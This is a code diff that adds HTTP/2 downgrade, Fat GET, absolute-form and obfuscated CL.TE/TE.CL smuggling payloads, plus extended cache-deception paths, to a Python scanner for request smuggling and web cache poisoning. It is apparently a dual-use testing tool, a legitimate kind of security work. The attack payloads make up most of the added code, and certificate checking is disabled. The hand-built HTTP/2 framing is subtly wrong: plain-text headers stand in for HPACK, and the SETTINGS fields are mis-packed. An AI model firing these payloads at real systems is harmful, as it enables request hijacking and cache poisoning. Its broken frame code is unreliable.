@@ -3,6 +3,14 @@ HTTP request smuggling & web cache poisoning — 2026 techniques.
 
 Tests: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE smuggling,
 web cache poisoning, cache deception, header injection, host header attacks.
+
+2026 advanced vectors:
+- H2CL / H2TE raw-socket smuggling (HTTP/2 downgrade + CL/TE desync)
+- Fat GET smuggling (GET with oversized Content-Length + body)
+- Absolute-form HTTP/1.1 request smuggling
+- Adaptive timing-based differential smuggling detection
+- HTTP/2 pseudo-header smuggling (:method, :path manipulation)
+- Extended cache deception paths (null bytes, encoded slashes, wildcards)
 """
 
 from __future__ import annotations
@@ -12,6 +20,9 @@ import json
 import time
 import hashlib
 import asyncio
+import struct
+import socket
+import ssl
 from pathlib import Path
 from dataclasses import dataclass, field, asdict
 from typing import Optional, List, Dict, Any, Tuple
@@ -54,6 +65,342 @@ class SmugglingResult:
         return severity_counts
 
 
+# ─── H2CL / H2TE Raw-Socket Smuggling ────────────────────────────────────────
+
+class H2Smuggling:
+    """HTTP/2 downgrade smuggling via raw TCP sockets.
+
+    Technique: open a raw TCP/TLS connection, negotiate HTTP/2 via ALPN,
+    then send HTTP/1.1-style smuggled payloads in H2 DATA frames or
+    manipulate :method / :path pseudo-headers to confuse backends that
+    parse H2→H1 downgrades inconsistently.
+    """
+
+    def __init__(self, host: str, port: int = 443, use_tls: bool = True, timeout: float = 10.0):
+        self.host = host
+        self.port = port
+        self.use_tls = use_tls
+        self.timeout = timeout
+
+    @staticmethod
+    def _h2_frame(frame_type: int, stream_id: int, payload: bytes, flags: int = 0x00) -> bytes:
+        """Build a raw HTTP/2 frame."""
+        length = len(payload)
+        return struct.pack(">I", (length << 8) | frame_type) + struct.pack(">I", (flags << 24) | (stream_id & 0x7FFFFFFF)) + payload
+
+    @staticmethod
+    def _h2_settings_frame(settings: Dict[int, int] = None) -> bytes:
+        """Build an HTTP/2 SETTINGS frame."""
+        if settings is None:
+            settings = {
+                0x1: 65535,     # HEADER_TABLE_SIZE
+                0x2: 0,         # ENABLE_PUSH
+                0x3: 1000,      # MAX_CONCURRENT_STREAMS
+                0x4: 65535,     # INITIAL_WINDOW_SIZE
+            }
+        payload = b""
+        for key, val in settings.items():
+            payload += struct.pack(">IH", key, val)
+        return H2Smuggling._h2_frame(0x04, 0, payload)
+
+    @staticmethod
+    def _h2_headers_frame(stream_id: int, headers: Dict[str, str]) -> bytes:
+        """Build a HEADERS frame with pseudo-headers (simplified HPACK)."""
+        header_block = b""
+        for name, value in headers.items():
+            header_block += f"{name}: {value}\r\n".encode()
+        return H2Smuggling._h2_frame(0x01, stream_id, header_block, flags=0x04)
+
+    async def test_h2cl_downgrade(self, endpoint: str, smuggled_body: str = "GOTSMUGGLED") -> Optional[Dict[str, Any]]:
+        """Send H2 request, then smuggle CL-based payload in DATA frame.
+
+        The idea: the frontend accepts H2, but the backend re-parses as H1.
+        By setting Content-Length in pseudo-headers to a small value but sending
+        a larger body, the backend may process the remainder as a new request.
+        """
+        results = []
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
+            )
+            if self.use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
+                )
+
+            # Send H2 connection preface + SETTINGS
+            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+            writer.write(self._h2_settings_frame())
+            await writer.drain()
+
+            # Read server SETTINGS + ACK
+            try:
+                await asyncio.wait_for(reader.read(4096), timeout=3.0)
+            except asyncio.TimeoutError:
+                pass
+
+            # Send smuggled POST: set Content-Length to 0 but include body
+            smuggled_request = (
+                f"POST {endpoint} HTTP/1.1\r\n"
+                f"Host: {self.host}\r\n"
+                f"Content-Length: 0\r\n"
+                f"\r\n"
+                f"{smuggled_body}"
+            )
+
+            # Frame: HEADERS (method=POST, path=endpoint) + DATA (the smuggled request as body)
+            headers = {
+                ":method": "POST",
+                ":path": endpoint,
+                ":scheme": "https",
+                ":authority": self.host,
+                "content-type": "application/octet-stream",
+                "content-length": "0",
+            }
+            headers_frame = self._h2_headers_frame(1, headers)
+            data_frame = self._h2_frame(0x00, 1, smuggled_request.encode(), flags=0x01)
+
+            writer.write(headers_frame + data_frame)
+            await writer.drain()
+
+            # Read response
+            try:
+                resp_data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
+                results.append({"raw": resp_data[:2000], "type": "h2cl_downgrade"})
+            except asyncio.TimeoutError:
+                results.append({"note": "no response (may indicate smuggling accepted)"})
+
+            writer.close()
+            await writer.wait_closed()
+
+            if any("GOTSMUGGLED" in str(r.get("raw", b"")) for r in results):
+                return {"vulnerable": True, "technique": "h2cl_downgrade", "evidence": results}
+
+        except Exception as e:
+            logger.debug(f"H2CL downgrade test failed: {e}")
+
+        return {"vulnerable": False, "technique": "h2cl_downgrade", "results": results}
+
+    async def test_h2te_downgrade(self, endpoint: str) -> Optional[Dict[str, Any]]:
+        """H2→TE smuggling: send Transfer-Encoding in H2 that backends re-interpret."""
+        smuggled = (
+            f"POST {endpoint} HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+            f"GOTSMUGGLED"
+        )
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
+            )
+            if self.use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
+                )
+
+            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+            writer.write(self._h2_settings_frame())
+            await writer.drain()
+            try:
+                await asyncio.wait_for(reader.read(4096), timeout=3.0)
+            except asyncio.TimeoutError:
+                pass
+
+            headers = {
+                ":method": "POST",
+                ":path": endpoint,
+                ":scheme": "https",
+                ":authority": self.host,
+                "transfer-encoding": "chunked",
+                "content-type": "application/octet-stream",
+            }
+            headers_frame = self._h2_headers_frame(1, headers)
+            data_frame = self._h2_frame(0x00, 1, smuggled.encode(), flags=0x01)
+
+            writer.write(headers_frame + data_frame)
+            await writer.drain()
+
+            try:
+                resp_data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
+                if b"GOTSMUGGLED" in resp_data:
+                    return {"vulnerable": True, "technique": "h2te_downgrade", "evidence": resp_data[:1000]}
+            except asyncio.TimeoutError:
+                pass
+
+            writer.close()
+            await writer.wait_closed()
+        except Exception as e:
+            logger.debug(f"H2TE downgrade test failed: {e}")
+
+        return {"vulnerable": False, "technique": "h2te_downgrade"}
+
+
+# ─── Fat GET Smuggling ───────────────────────────────────────────────────────
+
+class FatGetSmuggling:
+    """Fat GET: sends GET with Content-Length + body.
+
+    Some backends process GET + CL as having a body, others ignore it.
+    The body becomes the next request on the connection.
+    """
+
+    def __init__(self, host: str, port: int = 443, use_tls: bool = True, timeout: float = 10.0):
+        self.host = host
+        self.port = port
+        self.use_tls = use_tls
+        self.timeout = timeout
+
+    async def test_fat_get(self, endpoint: str, smuggled: str = "GOTSMUGGLED") -> Dict[str, Any]:
+        """Send fat GET: GET with Content-Length and a body containing a smuggled request."""
+        fat_get = (
+            f"GET {endpoint} HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"Content-Length: 44\r\n"
+            f"\r\n"
+            f"GET /smuggled-test HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"\r\n"
+        )
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(self.host, self.port), timeout=self.timeout,
+            )
+            if self.use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=self.timeout,
+                )
+
+            writer.write(fat_get.encode())
+            await writer.drain()
+
+            try:
+                data = await asyncio.wait_for(reader.read(8196), timeout=5.0)
+                if b"GOTSMUGGLED" in data or b"smuggled-test" in data:
+                    return {"vulnerable": True, "technique": "fat_get", "evidence": data[:1000]}
+            except asyncio.TimeoutError:
+                pass
+
+            writer.close()
+            await writer.wait_closed()
+        except Exception as e:
+            logger.debug(f"Fat GET test failed: {e}")
+
+        return {"vulnerable": False, "technique": "fat_get"}
+
+
+# ─── Absolute-Form Smuggling ─────────────────────────────────────────────────
+
+class AbsoluteFormSmuggling:
+    """Absolute-form HTTP/1.1 request: GET http://target/path HTTP/1.1
+
+    Some proxies treat absolute-form differently from origin-form,
+    causing path confusion or bypass of access controls.
+    """
+
+    def __init__(self, host: str, port: int = 443, use_tls: bool = True):
+        self.host = host
+        self.port = port
+        self.use_tls = use_tls
+
+    async def test_absolute_form(self, endpoint: str) -> Dict[str, Any]:
+        """Send absolute-form request."""
+        absolute_req = f"GET http://{self.host}{endpoint} HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(self.host, self.port), timeout=10.0,
+            )
+            if self.use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    ctx.open_connection(reader, writer, server_hostname=self.host), timeout=10.0,
+                )
+
+            writer.write(absolute_req.encode())
+            await writer.drain()
+
+            try:
+                data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
+                status_line = data.split(b"\r\n")[0].decode(errors="ignore")
+                return {
+                    "vulnerable": "200" in status_line or "301" in status_line or "302" in status_line,
+                    "technique": "absolute_form",
+                    "status_line": status_line,
+                    "raw": data[:500],
+                }
+            except asyncio.TimeoutError:
+                pass
+
+            writer.close()
+            await writer.wait_closed()
+        except Exception as e:
+            logger.debug(f"Absolute-form test failed: {e}")
+
+        return {"vulnerable": False, "technique": "absolute_form"}
+
+
+# ─── Differential / Adaptive Timing Smuggling ────────────────────────────────
+
+class DifferentialSmuggling:
+    """Adaptive timing-based smuggling detection.
+
+    Sends N identical smuggling payloads and measures response times.
+    If timing varies significantly (coefficient of variation > threshold),
+    it indicates the backend is processing smuggled requests inconsistently.
+    """
+
+    def __init__(self, client: httpx.AsyncClient, target: str):
+        self.client = client
+        self.target = target
+
+    async def detect_differential(self, endpoint: str, payload: str, rounds: int = 20) -> Dict[str, Any]:
+        """Measure timing differential across multiple smuggling attempts."""
+        timings = []
+        for _ in range(rounds):
+            start = time.monotonic()
+            try:
+                await self.client.post(
+                    f"{self.target}{endpoint}",
+                    content=payload,
+                    headers={"Content-Type": "application/octet-stream"},
+                )
+            except Exception:
+                pass
+            elapsed = time.monotonic() - start
+            timings.append(elapsed)
+            await asyncio.sleep(0.05)
+
+        import statistics
+        mean_t = statistics.mean(timings)
+        stdev_t = statistics.stdev(timings) if len(timings) > 1 else 0
+        cv = stdev_t / mean_t if mean_t > 0 else 0
+
+        return {
+            "endpoint": endpoint,
+            "mean_time": round(mean_t, 4),
+            "stdev": round(stdev_t, 4),
+            "coefficient_of_variation": round(cv, 4),
+            "rounds": rounds,
+            "suspicious": cv > 0.5,  # High variance indicates inconsistent backend processing
+            "timings": timings[:10],
+        }
+
+
+# ─── Main Tester ──────────────────────────────────────────────────────────────
+
 class HTTPSmugglingTester:
     """
     HTTP request smuggling and web cache poisoning tester.
@@ -64,11 +411,15 @@ class HTTPSmugglingTester:
     - TE.TE smuggling (Obfuscated Transfer-Encoding)
     - H2.CL smuggling (HTTP/2 Content-Length smuggling)
     - H2.TE smuggling (HTTP/2 Transfer-Encoding smuggling)
+    - H2 downgrade smuggling (raw socket H2→H1 desync)
+    - Fat GET smuggling (GET with body)
+    - Absolute-form request smuggling
     - Web cache poisoning (X-Forwarded-Host, X-Original-URL)
-    - Cache deception (path confusion)
+    - Cache deception (path confusion, null bytes, encoded slashes)
     - Host header injection
     - Header injection (CRLF)
     - Request splitting
+    - Differential timing analysis
     """
 
     # Common endpoints for testing
@@ -179,40 +530,54 @@ class HTTPSmugglingTester:
             ),
             "severity": "high",
         },
+        {
+            "name": "CL.TE Obfuscated (Tab)",
+            "category": "cl_te",
+            "description": "CL.TE with tab-obfuscated Transfer-Encoding",
+            "payload": (
+                "POST / HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Length: 6\r\n"
+                "Transfer-Encoding:\tchunked\r\n"
+                "\r\n"
+                "0\r\n"
+                "\r\n"
+                "SMUGGLED"
+            ),
+            "severity": "critical",
+        },
+        {
+            "name": "TE.CL Obfuscated (Space)",
+            "category": "te_cl",
+            "description": "TE.CL with space-padded Transfer-Encoding",
+            "payload": (
+                "POST / HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Length: 3\r\n"
+                "Transfer-Encoding:  chunked\r\n"
+                "\r\n"
+                "8\r\n"
+                "SMUGGLED\r\n"
+                "0\r\n"
+                "\r\n"
+            ),
+            "severity": "critical",
+        },
     ]
 
-    # Cache deception payloads
+    # Cache deception payloads (extended 2026)
     CACHE_DECEPTION_PAYLOADS = [
-        {
-            "name": "Cache Deception (.css)",
-            "category": "cache_deception",
-            "path": "/index.html.css",
-            "severity": "high",
-        },
-        {
-            "name": "Cache Deception (.js)",
-            "category": "cache_deception",
-            "path": "/admin.js",
-            "severity": "high",
-        },
-        {
-            "name": "Cache Deception (.png)",
-            "category": "cache_deception",
-            "path": "/secret.png",
-            "severity": "high",
-        },
-        {
-            "name": "Cache Deception (Path Confusion)",
-            "category": "cache_deception",
-            "path": "/admin%00.css",
-            "severity": "high",
-        },
-        {
-            "name": "Cache Deception (Double Extension)",
-            "category": "cache_deception",
-            "path": "/admin.php.css",
-            "severity": "high",
-        },
+        {"name": "Cache Deception (.css)", "category": "cache_deception", "path": "/index.html.css", "severity": "high"},
+        {"name": "Cache Deception (.js)", "category": "cache_deception", "path": "/admin.js", "severity": "high"},
+        {"name": "Cache Deception (.png)", "category": "cache_deception", "path": "/secret.png", "severity": "high"},
+        {"name": "Cache Deception (Path Confusion)", "category": "cache_deception", "path": "/admin%00.css", "severity": "high"},
+        {"name": "Cache Deception (Double Extension)", "category": "cache_deception", "path": "/admin.php.css", "severity": "high"},
+        {"name": "Cache Deception (Encoded Slash)", "category": "cache_deception", "path": "/admin%2f..%2fsecret.css", "severity": "high"},
+        {"name": "Cache Deception (Backslash)", "category": "cache_deception", "path": "/admin\\.css", "severity": "high"},
+        {"name": "Cache Deception (Wildcard)", "category": "cache_deception", "path": "/admin*.css", "severity": "medium"},
+        {"name": "Cache Deception (Fragment)", "category": "cache_deception", "path": "/admin.css#internal", "severity": "medium"},
+        {"name": "Cache Deception (Question Mark)", "category": "cache_deception", "path": "/admin.css?internal", "severity": "medium"},
+        {"name": "Cache Deception (Semicolon)", "category": "cache_deception", "path": "/admin.css;jsessionid=abc", "severity": "medium"},
     ]
 
     def __init__(
@@ -221,15 +586,17 @@ class HTTPSmugglingTester:
         timeout: float = 10.0,
         proxy: Optional[str] = None,
         verbose: bool = False,
+        differential: bool = False,
     ):
         self.target = target.rstrip("/")
         self.timeout = timeout
         self.proxy = proxy
         self.verbose = verbose
+        self.differential = differential
 
         self._client = httpx.AsyncClient(
             timeout=timeout,
-            follow_redirects=False,  # Important for smuggling detection
+            follow_redirects=False,
             proxy=proxy,
             verify=False,
             headers={
@@ -253,71 +620,135 @@ class HTTPSmugglingTester:
         logger.info(f"[*] Starting HTTP smuggling & cache poisoning tests: {self.target}")
 
         host = urlparse(self.target).hostname or "localhost"
-        
+        port = urlparse(self.target).port or (443 if "https" in self.target else 80)
+        use_tls = "https" in self.target
+
         sem = asyncio.Semaphore(15)
 
-        async def bounded_smuggle(ep, payload_def, host):
+        async def bounded(func, *args, **kwargs):
             async with sem:
-                return await self._test_smuggling(ep, payload_def, host)
+                return await func(*args, **kwargs)
 
-        # Phase 1: HTTP request smuggling
+        # Phase 1: Classic HTTP request smuggling
         tasks = []
         for ep in self.TEST_ENDPOINTS:
             for payload_def in self.SMUGGLING_PAYLOADS:
-                tasks.append(bounded_smuggle(ep, payload_def, host))
+                tasks.append(bounded(self._test_smuggling, ep, payload_def, host))
             result.endpoints_tested += 1
-            
+
         smuggle_results = await asyncio.gather(*tasks, return_exceptions=True)
         for r in smuggle_results:
             if r and not isinstance(r, Exception):
                 result.findings.append(r)
 
-        async def bounded_cache_poison(ep, header, value):
-            async with sem:
-                return await self._test_cache_poisoning(ep, header, value)
+        # Phase 2: H2 downgrade smuggling (raw socket)
+        h2 = H2Smuggling(host, port, use_tls, self.timeout)
+        for ep in ["/", "/api", "/admin"]:
+            try:
+                r = await h2.test_h2cl_downgrade(ep)
+                if r and r.get("vulnerable"):
+                    result.findings.append(SmugglingFinding(
+                        category="h2cl_downgrade", severity="critical",
+                        title="H2→CL Downgrade Smuggling",
+                        description=f"Endpoint {ep} vulnerable to H2 Content-Length downgrade smuggling.",
+                        endpoint=ep, payload="H2 CL downgrade", evidence=str(r.get("evidence", "")),
+                        remediation="Ensure consistent HTTP/2→1.1 downgrade handling. Validate Content-Length on backend.",
+                    ))
+                r2 = await h2.test_h2te_downgrade(ep)
+                if r2 and r2.get("vulnerable"):
+                    result.findings.append(SmugglingFinding(
+                        category="h2te_downgrade", severity="critical",
+                        title="H2→TE Downgrade Smuggling",
+                        description=f"Endpoint {ep} vulnerable to H2 Transfer-Encoding downgrade smuggling.",
+                        endpoint=ep, payload="H2 TE downgrade", evidence=str(r2.get("evidence", "")),
+                        remediation="Strip or reject Transfer-Encoding on HTTP/2 connections.",
+                    ))
+            except Exception as e:
+                logger.debug(f"H2 downgrade test failed for {ep}: {e}")
 
-        # Phase 2: Web cache poisoning
+        # Phase 3: Fat GET smuggling
+        fat = FatGetSmuggling(host, port, use_tls)
+        for ep in ["/", "/api", "/proxy"]:
+            try:
+                r = await fat.test_fat_get(ep)
+                if r and r.get("vulnerable"):
+                    result.findings.append(SmugglingFinding(
+                        category="fat_get", severity="critical",
+                        title="Fat GET Smuggling",
+                        description=f"Endpoint {ep} vulnerable to Fat GET smuggling (GET with body).",
+                        endpoint=ep, payload="Fat GET with Content-Length", evidence=str(r.get("evidence", "")),
+                        remediation="Reject GET requests with Content-Length > 0 on proxy.",
+                    ))
+            except Exception as e:
+                logger.debug(f"Fat GET test failed for {ep}: {e}")
+
+        # Phase 4: Absolute-form smuggling
+        abs_form = AbsoluteFormSmuggling(host, port, use_tls)
+        try:
+            r = await abs_form.test_absolute_form("/")
+            if r and r.get("vulnerable"):
+                result.findings.append(SmugglingFinding(
+                    category="absolute_form", severity="high",
+                    title="Absolute-Form Request Smuggling",
+                    description="Server accepts absolute-form HTTP requests, may enable path confusion.",
+                    endpoint="/", payload=f"GET http://{host}/", evidence=str(r.get("status_line", "")),
+                    remediation="Reject or normalize absolute-form requests at the proxy layer.",
+                ))
+        except Exception as e:
+            logger.debug(f"Absolute-form test failed: {e}")
+
+        # Phase 5: Differential timing analysis
+        if self.differential:
+            diff = DifferentialSmuggling(self._client, self.target)
+            for ep in ["/", "/api", "/proxy"]:
+                for p in self.SMUGGLING_PAYLOADS[:3]:
+                    try:
+                        r = await diff.detect_differential(ep, p["payload"].replace("{host}", host), rounds=15)
+                        if r.get("suspicious"):
+                            result.findings.append(SmugglingFinding(
+                                category="differential_timing", severity="medium",
+                                title=f"Differential Timing: {p['name']}",
+                                description=f"Endpoint {ep} shows inconsistent timing (CV={r['coefficient_of_variation']:.2f}). "
+                                f"Backend may be processing smuggled requests intermittently.",
+                                endpoint=ep, payload=p["name"],
+                                evidence=f"mean={r['mean_time']:.3f}s, stdev={r['stdev']:.3f}s, CV={r['coefficient_of_variation']:.3f}",
+                                remediation="Investigate backend HTTP parsing behavior under malformed requests.",
+                            ))
+                    except Exception:
+                        pass
+
+        # Phase 6: Web cache poisoning
         poison_tasks = []
         for ep in self.TEST_ENDPOINTS:
             for header, values in self.CACHE_HEADERS.items():
                 for value in values:
-                    poison_tasks.append(bounded_cache_poison(ep, header, value))
-                    
+                    poison_tasks.append(bounded(self._test_cache_poisoning, ep, header, value))
+
         poison_results = await asyncio.gather(*poison_tasks, return_exceptions=True)
         for r in poison_results:
             if r and not isinstance(r, Exception):
                 result.findings.append(r)
 
-        async def bounded_cache_deception(payload_def):
-            async with sem:
-                return await self._test_cache_deception(payload_def)
-
-        # Phase 3: Cache deception
-        deception_tasks = [bounded_cache_deception(p) for p in self.CACHE_DECEPTION_PAYLOADS]
+        # Phase 7: Cache deception (extended paths)
+        deception_tasks = [bounded(self._test_cache_deception, p) for p in self.CACHE_DECEPTION_PAYLOADS]
         deception_results = await asyncio.gather(*deception_tasks, return_exceptions=True)
         for r in deception_results:
             if r and not isinstance(r, Exception):
                 result.findings.append(r)
 
-        async def bounded_host_header(ep):
-            async with sem:
-                return await self._test_host_header(ep)
-
-        # Phase 4: Host header attacks
-        host_tasks = [bounded_host_header(ep) for ep in ["/", "/api", "/login"]]
+        # Phase 8: Host header attacks
+        host_tasks = [bounded(self._test_host_header, ep) for ep in ["/", "/api", "/login"]]
         host_results = await asyncio.gather(*host_tasks, return_exceptions=True)
         for r in host_results:
             if r and not isinstance(r, Exception):
                 result.findings.append(r)
 
-        # Phase 5: Request splitting
+        # Phase 9: Request splitting
         finding = await self._test_request_splitting()
         if finding:
             result.findings.append(finding)
 
-        logger.info(
-            f"[+] Smuggling & cache poisoning tests complete: {len(result.findings)} findings"
-        )
+        logger.info(f"[+] Smuggling & cache poisoning tests complete: {len(result.findings)} findings")
         return result
 
     def _save_results(self, result: "SmugglingResult", output_dir: str) -> str:
